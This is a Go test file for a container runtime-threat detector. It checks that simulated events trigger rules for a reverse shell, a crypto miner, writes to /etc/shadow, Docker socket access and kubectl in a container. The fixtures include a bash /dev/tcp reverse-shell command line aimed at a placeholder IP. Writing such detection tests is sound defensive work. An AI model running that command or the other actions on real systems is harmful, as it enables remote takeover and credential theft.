package runtimeevents

import (
	"context"
	"testing"

	"github.com/bellu/bellucode/services/bellud/internal/findings"
	"github.com/bellu/bellucode/services/bellud/internal/runtimeevents/wire"
)

func TestEvaluateEvent(t *testing.T) {
	pod := func(e wire.Event) wire.Event {
		e.Node, e.Namespace, e.Pod, e.ContainerID = "n1", "ns", "p1", "c1"
		return e
	}
	cases := map[string]wire.Event{
		"runtime.reverse_shell":        pod(wire.Event{Type: wire.TypeShellSpawn, ProcessPath: "/bin/bash", Args: "-i >& /dev/tcp/1.2.3.4/4444 0>&1"}),
		"runtime.crypto_miner":         pod(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/tmp/xmrig"}),
		"runtime.sensitive_file_write": pod(wire.Event{Type: wire.TypeFileWrite, Args: "/etc/shadow"}),
		"runtime.docker_socket_mount":  pod(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/usr/bin/curl", Args: "--unix-socket /var/run/docker.sock"}),
		"runtime.cli_in_container":     pod(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/usr/local/bin/kubectl"}),
	}
	for rule, ev := range cases {
		fs := EvaluateEvent("ws", ev)
		found := false
		for _, f := range fs {
			if f.RuleID == rule && f.Type == findings.TypeRuntimeThreat {
				found = true
			}
		}
		if !found {
			t.Errorf("%s not matched: %+v", rule, fs)
		}
	}
	if fs := EvaluateEvent("ws", pod(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/bin/ls"})); len(fs) != 0 {
		t.Errorf("benign event matched: %+v", fs)
	}
	a := EvaluateEvent("ws", cases["runtime.crypto_miner"])[0]
	b := EvaluateEvent("ws", cases["runtime.crypto_miner"])[0]
	if a.ID != b.ID {
		t.Error("finding id must be stable per (rule, workload)")
	}
}

type fakeRep struct{ n int }

func (f *fakeRep) Report(_ context.Context, _ findings.ScanRef, fs []findings.Finding) (findings.ReportResult, error) {
	f.n += len(fs)
	return findings.ReportResult{}, nil
}

func TestRuleHook(t *testing.T) {
	r := &fakeRep{}
	h := RuleHook("ws", r, nil)
	h(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/bin/ls"})
	h(wire.Event{Type: wire.TypeProcessExec, ProcessPath: "/opt/xmrig", Node: "n"})
	if r.n != 1 {
		t.Fatalf("reported %d, want 1", r.n)
	}
}
